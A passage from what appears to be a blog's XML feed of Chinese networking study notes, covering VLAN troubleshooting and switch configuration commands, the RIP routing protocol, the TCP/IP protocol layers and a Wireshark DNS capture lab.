检查VLAN配置            </strong>            ：确认VLAN划分正确，并且主机都被分配到了正确的VLAN。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                检查端口配置            </strong>            ：确保交换机端口被正确地分配到相应的VLAN。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                检查VLAN接口状态            </strong>            ：确保VLAN接口处于            <strong>                激活状态            </strong>            。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                检查交换机模式            </strong>            ：确认交换机工作在正确的模式下，例如，是否是Access模式或者Trunk模式。        </span>    </li></ul><hr /><h2>    <span style="font-size: 16px;">        3.划分vlan后，不同交换机上同vlan的主机ping不通？    </span></h2><ul>    <li>        <span style="font-size: 16px;">            <strong>                检查Trunk链接            </strong>            ：确保连接两个            <strong>                交换机的端口配置为Trunk模式            </strong>            ，并且            <strong>                允许相应的VLAN通过            </strong>            。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                检查VLAN透传            </strong>            ：确认VLAN信息在交换机之间正确透传。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                检查路由配置            </strong>            ：如果VLAN间通信需要通过路由器，确保路由器配置了正确的接口和路由规则。        </span>    </li></ul><hr /><h2>    <span style="font-size: 16px;">        4.接入三层交换机，划分vlan后，不同交换机上不同vlan的主机仍ping不通？    </span></h2><ul>    <li>        <span style="font-size: 16px;">            <strong>                检查三层交换机配置            </strong>            ：确认三层交换机的VLAN接口配置正确，并且启用了路由功能。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                检查路由协议            </strong>            ：如果使用动态路由协议，确保协议配置正确，并且所有设备都参与到路由协议中。        </span>    </li></ul><hr /><h1>    八、参考命令及资料</h1><blockquote>    <h2>        <strong>            1        </strong>        <strong>            .        </strong>        <strong>            交换机命令行操作模式的进入        </strong>    </h2>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;&nbsp;&nbsp;switch&gt;enable &nbsp;&nbsp;&nbsp;&nbsp; !进入级特权模式        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;&nbsp;&nbsp;switch#        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;&nbsp;&nbsp;switch# configure terminal &nbsp;&nbsp;&nbsp;            !进入全局配置模式        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;&nbsp;&nbsp;switch(config)#        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;&nbsp;&nbsp;switch(config)# interface fastethernet 0/5 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!进入交换机F0/5的接口模式        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;&nbsp;&nbsp;switch(config-if)#        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;&nbsp;&nbsp;switch(config-if)# exit &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;            !退回到上一级操作模式        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;&nbsp;&nbsp;switch(config)#        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;&nbsp;&nbsp;switch(config-if)# end &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;            !直接退回到特权模式        </span>    </p>    <p>        <span style="font-size: 16px;">            switch#        </span>    </p>    <p>        <span style="font-size: 16px;">            switch# exit &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!退出配置状态        </span>    </p>    <p>        <span style="font-size: 16px;">            switch&gt;        </span>    </p></blockquote><blockquote>    <h2>        <strong>            2        </strong>        <strong>            .交换机设备名称的配置。        </strong>    </h2>    <p>        <span style="font-size: 16px;">            switch(config)# hostname &nbsp;n-switch !配置交换机的设备名称为n-switch(n为学号)        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;&nbsp;&nbsp;n-switch(config)#        </span>    </p></blockquote><blockquote>    <h2>        <strong>            3        </strong>        <strong>            .查看交换机各项信息。        </strong>    </h2>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;&nbsp;&nbsp;N-switch#            <strong>                show version            </strong>            &nbsp;&nbsp;&nbsp;&nbsp; !查看交换机的版本信息        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;&nbsp;&nbsp;N-switch#            <strong>                show mac-address-table            </strong>            &nbsp;&nbsp;&nbsp;&nbsp; !查看交换机的MAC地址表        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;&nbsp;&nbsp;N-switch#            <strong>                &nbsp;show running-config            </strong>            &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!查看交换机当前生效的配置信息        </span>    </p></blockquote><blockquote>    <h2>        <strong>            4.        </strong>        <strong>            二层交换机配置        </strong>        <strong>            指南        </strong>    </h2>    <ul>        <li>            <span style="font-size: 18px;">                在交换机上创建vlan            </span>        </li>    </ul>    <p>        <span style="font-size: 16px;">            switch(config)# Vlan 10 &nbsp; !创建vlan 10        </span>    </p>    <p>        <span style="font-size: 16px;">            switch(config-vlan)# name xingzhendadui &nbsp;&nbsp;&nbsp; !将Vlan10命名为test10        </span>    </p>    <p>        <span style="font-size: 16px;">            switch(config-vlan)# exit        </span>    </p>    <ul>        <li>            <span style="font-size: 18px;">                将接口分配到VLAN            </span>        </li>    </ul>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;switch(config)# interface fastethernet 0/1&nbsp;        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;switch(config-if)#&nbsp;switchport access vlan 10 !将fastethernet            0/1端口加入vlan10中        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;switch(config-if)#&nbsp;exit        </span>    </p>    <ul>        <li>            <span style="font-size: 18px;">                设置交换机之间互联的接口(假设为0/24端口)为tag vlan 模式。            </span>        </li>    </ul>    <p>        <span style="font-size: 16px;">            Switch(config)# interface fastethernet 0/24        </span>    </p>    <p>        <span style="font-size: 16px;">            Switch(config-if)#&nbsp;switchport mode trunk        </span>    </p>    <p>        <span style="font-size: 16px;">            Switch# show interfaces fastethernet 0/24 switchport        </span>    </p>    <p>        <span style="font-size: 16px;">            ! 验证fastethemet 0/24端口已被设置为tag vlan模式        </span>    </p></blockquote><blockquote>    <h2>        <strong>            5        </strong>        <strong>            .三层交换机配置        </strong>        <strong>            指南        </strong>    </h2>    <ul>        <li>            <span style="font-size: 18px;">                在三层交换机上创建vlan            </span>        </li>    </ul>    <p>        <span style="font-size: 16px;">            switch(config)# Vlan 10 &nbsp; !创建vlan 10        </span>    </p>    <p>        <span style="font-size: 16px;">            switch(config-vlan)# name xingzhendadui &nbsp;&nbsp;&nbsp; !将Vlan10命名为test10        </span>    </p>    <p>        <span style="font-size: 16px;">            switch(config-vlan)# exit        </span>    </p>    <ul>        <li>            <span style="font-size: 18px;">                将连接主机的交换机接口分配到VLAN            </span>        </li>    </ul>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;switch(config)# interface fastethernet 0/1&nbsp;        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;switch(config-if)#&nbsp;switchport access vlan 10 !将fastethernet            0/1端口加入vlan10中        </span>    </p>    <p>        <span style="font-size: 16px;">            &nbsp;&nbsp;switch(config-if)#&nbsp;exit        </span>    </p>    <ul>        <li>            <span style="font-size: 18px;">                设置交换机之间互联的接口(假设为0/24端口)为tag vlan 模式。            </span>        </li>    </ul>    <p>        <span style="font-size: 16px;">            Switch(config)# interface fastethernet 0/24        </span>    </p>    <p>        <span style="font-size: 16px;">            Switch(config-if)#&nbsp;switchport trunk encapsulation dot1q        </span>    </p>    <p>        <span style="font-size: 16px;">            Switch(config-if)#&nbsp;switchport mode trunk        </span>    </p>    <p>        <span style="font-size: 16px;">            Switch# show interfaces fastethernet 0/24 switchport        </span>    </p>    <p>        <span style="font-size: 16px;">            ! 验证fastethemet 0/24端口已被设置为tag vlan模式        </span>    </p>    <ul>        <li>            <span style="font-size: 18px;">                设置三层交换机VLAN间通信            </span>        </li>    </ul>    <p>        <span style="font-size: 16px;">            Switch (config)# interface vlan 10 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!配置虚拟接口vlan            10        </span>    </p>    <p>        <span style="font-size: 16px;">            Switch (config-if)# ip address            <strong>                &nbsp;192.168.10.254 &nbsp;255.255.255.0            </strong>        </span>    </p>    <p>        <span style="font-size: 16px;">            !配置虚拟接口vlan 10的地址为192.168.10.254        </span>    </p>    <p>        <span style="font-size: 16px;">            Switch (config-if)# no shutdown &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!开启端口        </span>    </p>    <p>        <span style="font-size: 16px;">            Switch (config-if)# exit        </span>    </p></blockquote><p>    &nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 交换网络组建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内部网关协议RIP-路由选择协议</title>
      <link href="/posts/cc0e.html"/>
      <url>/posts/cc0e.html</url>
      
        <content type="html"><![CDATA[<hr /><blockquote>    <p>        <strong>            路由信息协议RIP(Routing Information Protocol)        </strong>        是内部网关协议IGP中最先得到广泛使用的协议，其相关标准文档为RFC1058。    </p></blockquote><hr /><h1>    一、RIP基本工作原理</h1><ul>    <li>        <span style="font-size: 16px;">            RIP要求自治系统AS内的每一个路由器都要维护从它自己到AS内其他每一个网络的距离记录。这是一组距离，称为&ldquo;            <span style="color: #ba372a;">                <strong>                    距离向量D-V(Distance-Vector)                </strong>            </span>            &rdquo;        </span>    </li>    <li>        <span style="font-size: 16px;">            RIP使用            <span style="color: #ba372a;">                <strong>                    跳数(Hop Count)                </strong>            </span>            作为度量(Metric)来衡量到达目的网络的距离        </span>        <ul>            <li>                <span style="font-size: 16px;">                    路由器到直连网络的距离定义为1                </span>            </li>            <li>                <span style="font-size: 16px;">                    路由器到非直连网络的距离定义为所经过的路由器数加1                </span>                <img src="https://cdn.nlark.com/yuque/0/2024/png/35065212/1716885971487-0605a120-a762-49af-941e-28923ea47405.png#averageHue=%23efefef&amp;clientId=u887dbb94-d3bb-4&amp;from=paste&amp;height=263&amp;id=rNAnm&amp;originHeight=394&amp;originWidth=2343&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=232934&amp;status=done&amp;style=none&amp;taskId=u31159b4a-9dfd-42dc-b841-4ddc30431c7&amp;title=&amp;width=1562"                alt="image.png" />            </li>            <li>                允许一条路径最多只能包含15个路由器。                <span style="color: #ba372a;">                    <strong>                        &ldquo;距离&rdquo;等于16时相当于不可达                    </strong>                </span>                。                <strong>                    因此，RIP只适用于小型互联网。                </strong>            </li>        </ul>    </li></ul><hr /><h1>    二、好的路由和等价负载均衡</h1><h2>    （一）好的路由</h2><p>    <span style="font-size: 16px;">        &emsp;&emsp;RIP认为        <strong>            好的路由        </strong>        就是&ldquo;距离短&rdquo;的路由，也就是        <strong>            所通过路由器数量最少的路由。        </strong>    </span>    <img src="https://cdn.nlark.com/yuque/0/2024/png/35065212/1716886088924-6ed5f2bf-5cbf-44ed-8844-da223207fb6c.png#averageHue=%23f8f7f6&amp;clientId=u887dbb94-d3bb-4&amp;from=paste&amp;height=665&amp;id=u6f541c31&amp;originHeight=997&amp;originWidth=1621&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=470095&amp;status=done&amp;style=none&amp;taskId=u8e8435b6-cb8a-4cbe-a36a-bb64e4b5ec6&amp;title=&amp;width=1080.6666666666667"    alt="image.png" /></p><h2>    （二）等价负载均衡</h2><p>    <span style="font-size: 16px;">        &emsp;&emsp;当到达同一目的网络有多条&ldquo;距离相等&rdquo;的路由时，可以进行        <strong>            等价负载均衡        </strong>        。    </span>    <img src="https://cdn.nlark.com/yuque/0/2024/png/35065212/1716886249085-355f5221-38e0-4283-a58b-c20479d30a07.png#averageHue=%23f9f7f5&amp;clientId=u887dbb94-d3bb-4&amp;from=paste&amp;height=482&amp;id=u7b134669&amp;originHeight=723&amp;originWidth=1588&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=405114&amp;status=done&amp;style=none&amp;taskId=u48615f62-e6b7-44cb-bb02-b234a693ebb&amp;title=&amp;width=1058.6666666666667"    alt="image.png" /></p><hr /><h1>    三、RIP 的三个要点</h1><h2>    （1）仅和相邻的路由器交换信息</h2><h2>    （2）路由器交换的信息是自己现在的路由表</h2><h2>    （3）按照固定的时间间隔（周期性）交换路由信息</h2><p>    <img src="https://cdn.nlark.com/yuque/0/2024/png/35065212/1716886303794-d0087e2e-f8a1-4342-8dcd-ba6c6f620424.png#averageHue=%23f6f2f2&amp;clientId=u887dbb94-d3bb-4&amp;from=paste&amp;height=525&amp;id=ubc02ec17&amp;originHeight=787&amp;originWidth=2406&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=592951&amp;status=done&amp;style=none&amp;taskId=u7b6d3e7e-cdb2-4135-a8f8-244273f5c42&amp;title=&amp;width=1604"    alt="image.png" /></p><hr /><h1>    四、RIP 的基本工作过程</h1><p>    <img src="https://cdn.nlark.com/yuque/0/2024/png/35065212/1716886390186-19368a0a-4f53-4af3-b7cc-e54a6086e1fe.png#averageHue=%23f3f1f1&amp;clientId=u887dbb94-d3bb-4&amp;from=paste&amp;height=861&amp;id=ub7f7eb8d&amp;originHeight=1291&amp;originWidth=2515&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=1123794&amp;status=done&amp;style=none&amp;taskId=u296f4e42-f60f-49cf-85ee-0a508eff413&amp;title=&amp;width=1676.6666666666667"    alt="image.png" /></p><hr /><h1>    五、RIP 的路由条目更新规则</h1><ol>    <li>        <span style="font-size: 16px;">            发现了新的网络，            <strong>                添加            </strong>        </span>    </li>    <li>        <span style="font-size: 16px;">            到达目的网络，不同下一跳，新路由优势，            <strong>                更新            </strong>        </span>    </li>    <li>        <span style="font-size: 16px;">            到达目的网络，不同下一跳，等价负载均衡        </span>    </li>    <li>        <span style="font-size: 16px;">            到达目的网络，相同下一跳，最新消息，            <strong>                更新            </strong>        </span>    </li>    <li>        <span style="font-size: 16px;">            到达目的网络，不同下一跳，新路由劣势，            <strong>                不更新            </strong>        </span>    </li></ol><h2>    示例 1</h2><p>    <img src="https://cdn.nlark.com/yuque/0/2024/png/35065212/1716886639497-361aba53-5abd-4983-927f-f932d8865e7d.png#averageHue=%23f7f7f7&amp;clientId=u887dbb94-d3bb-4&amp;from=paste&amp;height=567&amp;id=uba0af1ad&amp;originHeight=850&amp;originWidth=2536&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=650076&amp;status=done&amp;style=none&amp;taskId=u54f2ae89-fb38-4d1a-9472-1c55f61c703&amp;title=&amp;width=1690.6666666666667"    alt="image.png" /></p><h2>    示例 2</h2><p>    <img src="https://cdn.nlark.com/yuque/0/2024/png/35065212/1716886662862-2a61d6fc-e720-4527-aab8-34044ff0124d.png#averageHue=%23f7f7f7&amp;clientId=u887dbb94-d3bb-4&amp;from=paste&amp;height=539&amp;id=u8c5c4618&amp;originHeight=808&amp;originWidth=2553&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=637545&amp;status=done&amp;style=none&amp;taskId=u0d39d257-fce7-4673-a637-59d15092e30&amp;title=&amp;width=1702"    alt="image.png" /></p><hr /><h1>    六、RIP存在&ldquo;坏消息传播得慢&rdquo;的问题</h1><p>    <span style="font-size: 16px;">        &emsp;&emsp;&ldquo;坏消息传播得慢&rdquo;又称为        <span style="color: #ba372a;">            <strong>                路由环路            </strong>        </span>        或        <span style="color: #ba372a;">            <strong>                距离无穷计数问题            </strong>        </span>        ，这是距离向量算法的一个固有问题。    </span></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;可以采取多种措施减少出现该问题的概率或减小该问题带来的危害，如下：    </span></p><ul>    <li>        <span style="font-size: 16px;">            限制最大路径距离为15(16表示不可达)。        </span>    </li>    <li>        <span style="font-size: 16px;">            当路由表发生变化时就立即发送更新报文(即&ldquo;触发更新&rdquo;)，而不仅是周期性发送。        </span>    </li>    <li>        <span style="font-size: 16px;">            让路由器记录收到某特定路由信息的接口，而不让同一路由信息再通过此接口向反方向传送(即&ldquo;水平分割&rdquo;。            <br />        </span>    </li></ul><p>    &nbsp;</p><p>    <img src="https://cdn.nlark.com/yuque/0/2024/png/35065212/1716887385626-4d11e693-f463-4af7-8daf-5ee8a4b81c35.png#averageHue=%23f7f4ec&amp;clientId=u9eb29051-b703-4&amp;from=paste&amp;height=637&amp;id=u787e532d&amp;originHeight=955&amp;originWidth=2496&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=558502&amp;status=done&amp;style=none&amp;taskId=ufdbd4519-670d-4607-9cb2-b244e2989c2&amp;title=&amp;width=1664"    alt="image.png" />    <img src="https://cdn.nlark.com/yuque/0/2024/png/35065212/1716887416492-7658983c-c3eb-49eb-a90f-8decf9c260eb.png#averageHue=%23f5c0b8&amp;clientId=u9eb29051-b703-4&amp;from=paste&amp;height=613&amp;id=u437406af&amp;originHeight=919&amp;originWidth=2419&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=487633&amp;status=done&amp;style=none&amp;taskId=u1c4b5968-bd6c-4f34-aa4c-a1b04b6fc1d&amp;title=&amp;width=1612.6666666666667"    alt="image.png" /></p><hr /><p>    &nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RIP </tag>
            
            <tag> 内部网关协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP/IP协议族体系结构以及主要协议</title>
      <link href="/posts/93c7.html"/>
      <url>/posts/93c7.html</url>
      
        <content type="html"><![CDATA[<h1>    TCP/IP协议族体系结构以及主要协议</h1><p>    &emsp;&emsp;    <span style="font-size: 16px;">        TCP/IP协议族是一个        <span style="text-decoration: underline;">            四层协议系统        </span>        ，自底而上分别是        <code>            数据链路层        </code>        、        <code>            网络层        </code>        、        <code>            传输层        </code>        和        <code>            应用层        </code>        。每一层完成不同    </span>    <br />    <span style="font-size: 16px;">        的功能，且通过若干协议来实现，上层协议使用下层协议提供的服务。    </span></p><p>    <span style="font-size: 16px;">        <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240613104531207-1065975173.png"        />    </span></p><hr /><h1>    （1）数据链路层</h1><blockquote>    <p>        <span style="font-size: 16px;">            &emsp;&emsp;数据链路层实现了网卡接口的网络驱动程序，以处理数据在物理媒介（比如以太网、令牌环等）上的传输。        </span>    </p></blockquote><p>    <span style="font-size: 16px;">        &emsp;&emsp;数据链路层两个常用的协议是        <strong>            <code>                ARP协议            </code>        </strong>        （Address Resolve Protocol，地址解析协议）和        <strong>            <code>                RARP协议            </code>        </strong>        （ReverseAddress Resolve Protocol，逆地址解析协议）。它们实现了IP地址和机器物理地址（通常是MAC地址，以太网、令牌环和802.11无线网络都使用MAC地址）之间的相互转换。    </span></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;        <strong>            网络层使用IP地址寻址一台机器        </strong>        ，而        <strong>            数据链路层使用物理地址寻址一台机器        </strong>        ，因此        <span style="text-decoration: underline;">            网络层必须先将目标机器的IP地址转化成其物理地址，才能使用数据链路层提供的服务，这就是ARP协议的用途        </span>        。    </span></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;RARP协议仅用于网络上的某些无盘工作站。因为缺乏存储设备，无盘工作站无法记住自己的IP地址，但它们可以利用网卡上的物理地址来向网    </span>    <span style="font-size: 16px;">        络管理者（服务器或网络管理软件）查询自身的IP地址。运行RARP服务的网络管理者通常存有该网络上所有机器的物理地址到IP地址的映射。    </span></p><hr /><h1>    （2）网络层</h1><blockquote>    <p>        <span style="font-size: 16px;">            &emsp;&emsp;网络层实现数据包的选路和转发。        </span>        <br />        <span style="font-size: 16px;">            &emsp;&emsp;        </span>        <span style="font-size: 16px;">            WAN（Wide Area Network，广域网）通常使用众多分级的路由器来连接分散的主机或LAN（Local Area Network，局域网），因此，通信的两台主机一般不是直接相连的，而是通过多个中间节点（路由器）连接的。            <strong>                网络层的任务就是选择这些中间节点，以确定两台主机之间的通信路径            </strong>            。同时，网络层对上层协议隐藏了网络拓扑连接的细节，使得在传输层和网络应用程序看来，通信的双方是直接相连的。        </span>    </p></blockquote><p>    <span style="font-size: 16px;">        &emsp;&emsp;网络层最核心的协议是        <code>            <strong>                IP协议            </strong>        </code>        （Internet Protocol，因特网协议）。    </span>    <span style="font-size: 16px;">        IP协议根据数据包的目的IP地址来决定如何投递它。如果数据包不能直接发送给目标主机，那么IP协议就为它寻找一个合适的下一跳（next hop）路由器，并将数据包交付给该路由器来转发。多次重复这一过程，数据包最终到达目标主机，或者由于发送失败而被丢弃。可见，IP协议使用逐跳（hop        by hop）的方式确定通信路径。    </span></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;网络层另外一个重要的协议是        <code>            <strong>                ICMP协议            </strong>        </code>        （Internet Control Message Protocol，因特网控制报文协议）。它是IP协议的重要补充，主要用于检测网络连接。    </span></p><p>    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240613104647596-179636174.png"    /></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;8位类型字段用于区分报文类型。它将ICMP报文分为两大类    </span></p><ul>    <li style="list-style-type: none;">        <ul>            <li>                <span style="font-size: 16px;">                    差错报文，这类报文主要用来回应网络错误，比如目标不可到达（类型值为3）和重定向（类型值为5）；                </span>            </li>            <li>                <span style="font-size: 16px;">                    查询报文，这类报文用来查询网络信息，比如ping程序就是使用ICMP报文查看目标是否可到达（类型值为8）的。                </span>            </li>        </ul>    </li></ul><p>    <span style="font-size: 16px;">        &emsp;&emsp;有的ICMP报文还使用8位代码字段来进一步细分不同的条件。比如重定向报文使用代码值0表示对网络重定向，代码值1表示对主机重定向。    </span></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;ICMP报文使用16位校验和字段对整个报文（包括头部和内容部分）进行循环冗余校验（Cyclic Redundancy        Check，CRC），以检验报文在传输过程中是否损坏。不同的ICMP报文类型具有不同的正文内容。    </span></p><hr /><h1>    （3）传输层</h1><blockquote>    <p>        <span style="font-size: 16px;">            &emsp;&emsp;传输层为两台主机上的应用程序提供端到端（end to end）的通信。与网络层使用的逐跳通信方式不同，传输层只关心通信的起始端和目的端，而不在乎数据包的中转过程。        </span>    </p></blockquote><p>    <span style="font-size: 16px;">        <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240613104707792-1191497317.png"        />    </span></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;垂直的实线箭头表示TCP/IP协议族各层之间的实体通信（数据包确实是沿着这些线路传递的），而水平的虚线箭头表示逻辑通信线路。该图中还附带描述了不同物理网络的连接方法。可见，    </span>    <br />    <span style="font-size: 16px;">        数据链路层（驱动程序）封装了物理网络的电气细节；网络层封装了网络连接的细节；传输层则为应用程序封装了一条端到端的逻辑通信链路，它负责数据的收发、链路的超时重连等。    </span></p><h2>    <span style="font-size: 16px;">        &emsp;&emsp;传输层协议：TCP协议、UDP协议。    </span></h2><h3>    <span style="font-size: 16px;">        &emsp;&emsp;①TCP协议（传输控制协议）    </span></h3><p>    <span style="font-size: 16px;">        &emsp;&emsp;为应用层提供可靠的、面向连接的和基于流（stream）的服务。TCP协议使用超时重传、数据确认等方式来确保数据包被正确地发送至目的端，因此TCP服务是可靠的。使用TCP协议通信的双方必须先建立TCP连接，并在内核中为该连接维持一些必要的数据结构，比如连接的状态、读写缓冲区，以及诸多定时器等。当通信结束时，双方必须关闭连接以释放这些内核数据。TCP服务是基于流的。基于流的数据没有边界（长度）限制，它源源不断地从通信的一端流入另一端。发送端可以逐个字节地向数据流中写入数据，接收端也可以逐个字节地将它们读出。    </span></p><h3>    <span style="font-size: 16px;">        &emsp;&emsp;②UDP协议（用户数据报协议）    </span></h3><p>    <span style="font-size: 16px;">        &emsp;&emsp;则与TCP协议完全相反，它为应用层提供不可靠、无连接和基于数据报的服务。&ldquo;不可靠&rdquo;意味着UDP协议无法保证数据从发送端正确地传送到目的端。如果数据在中途丢失，或者目的端通过数据校验发现数据错误而将其丢弃，则UDP协议只是单地通知应用程序发送失败。因此，使用UDP协议的应用程序通常要自己处理数据确认、超时重传等逻辑。UDP协议是无连接的，即通信双方不保持一个长久的联系，因此应用程序每次发送数据都要明确指定接收端的地址（IP地址等信息）。基于数据报的服务，是相对基于流的服务而言的。每个UDP数据报都有一个长度，接收端必须以该长度为最小单位将其所有内容一次性读出，否则数据将被截断。    </span></p><hr /><h1>    （4）应用层</h1><blockquote>    <p>        <span style="font-size: 16px;">            &emsp;&emsp;应用层负责处理应用程序的逻辑。        </span>    </p></blockquote><p>    <span style="font-size: 16px;">        &emsp;&emsp;数据链路层、网络层和传输层负责处理网络通信细节，这部分必须既稳定又高效，因此它们都在内核空间中实现。而应用层则在用户空间实现，因为它负责处理众多逻辑，比如文件传输、名称查询和网络管理等。如果应用层也在内核中实现，则会使内核变得非常庞大。当然，也有少数服务器程序是在内核中实现的，这样代码就无须在用户空间和内核空间来回切换（主要是数据的复制），极大地提高了工作效率。不过这种代码实现起来较复杂，不够灵活，且不便于移植。    </span></p><ul>    <li>        <span style="font-size: 16px;">            <strong>                ping            </strong>            是应用程序，而不是协议，前面说过它利用ICMP报文检测网络连接，是调试网络环境的必备工具。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                telnet协议            </strong>            是一种远程登录协议，它使我们能在本地完成远程任务。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                OSPF            </strong>            （Open Shortest Path First，开放最短路径优先）协议是一种动态路由更新协议，用于路由器之间的通信，以告知对方各自的路由信息。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                DNS            </strong>            （Domain Name Service，域名服务）协议提供机器域名到IP地址的转换。        </span>    </li></ul><p>    <span style="font-size: 16px;">        &emsp;&emsp;应用层协议（或程序）可能跳过传输层直接使用网络层提供的服务，比如ping程序和OSPF协议。应用层协议（或程序）通常既可以使用TCP服务，又可以使用UDP服务，比如DNS协议。我们可以通过/etc/services文件查看所有知名的应用层协议，以及它们都能使用哪些传输层服务。    </span></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;五层协议背后的思想：上层屏蔽下层细节，只使用其提供的服务。高内聚低耦合，每一层专注于其功能，各层之间的关系依赖不大。    </span></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;数据包在每层有不同的格式，从上到下依次叫段，数据报，帧    </span>    <span style="font-size: 16px;">        ，数据从应用层通过协议栈向下传递，每经过一层加上对应层协议的报头，最后封装成帧发送到传输介质上，到达路由器或者目的主机剥掉头部，交付给上层需要者。这一过程称为封装，传输，分离，分用。    </span></p><p>    &nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP/IP协议族 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Wireshark抓包分析DNS域名解析过程</title>
      <link href="/posts/6232.html"/>
      <url>/posts/6232.html</url>
      
        <content type="html"><![CDATA[<h1>    一、DNS协议概述</h1><p>    <span style="font-size: 16px;">        &emsp;&emsp;DNS协议也可以称为DNS服务，全称是Domain Name System，即域名系统，和HTTP协议一样，也是一个位于        <code>            <strong>                应用层的协议（服务）            </strong>        </code>        ，它是基于运输层的UDP协议的。    </span>    <br />    <span style="font-size: 16px;">        从DNS的名字我们就可以知道，它        <span style="text-decoration: underline;">            <span style="color: #000000; text-decoration: underline;">                提供域名映射到IP地址的服务            </span>        </span>        。    </span></p><hr /><h1>    二、实验目的</h1><ol>    <li>        <span style="font-size: 16px;">            掌握DNS域名解析过程        </span>    </li>    <li>        <span style="font-size: 16px;">            熟悉DNS报文格式        </span>    </li></ol><hr /><h1>    三、实验原理</h1><p>    <span style="font-size: 16px;">        &emsp;&emsp;使用ping访问域名地址，利用wireshark网络抓包工具，抓包分析DNS域名解析协议过程    </span></p><hr /><h1>    四、实验内容</h1><p>    <span style="font-family: 'PingFang SC', 宋体; font-size: 16px;">        &emsp;&emsp;在浏览器中输入        <code>            <strong>                https://www.baidu.com            </strong>        </code>        ，进行访问，然后同时利用Wireshark进行抓包，抓包后，通过显示过滤器显示        <code>            DNS        </code>        协议：    </span></p><p>    <span style="font-family: 仿宋; font-size: 16px;">        <img src="https://pic.rmb.bdstatic.com/bjh/240613/be4534165665d805fc109c456d8a74445858.jpeg"        />    </span></p><p>    <span style="font-family: 仿宋; font-size: 16px;">        <img src="https://pic.rmb.bdstatic.com/bjh/240613/83266099e5241bfe9136abbcf697b3064372.jpeg"        />    </span></p><hr /><p>    &nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wireshark抓包 </tag>
            
            <tag> DNS域名解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微博爬虫-指定话题当日数据爬取</title>
      <link href="/posts/bee6.html"/>
      <url>/posts/bee6.html</url>
      
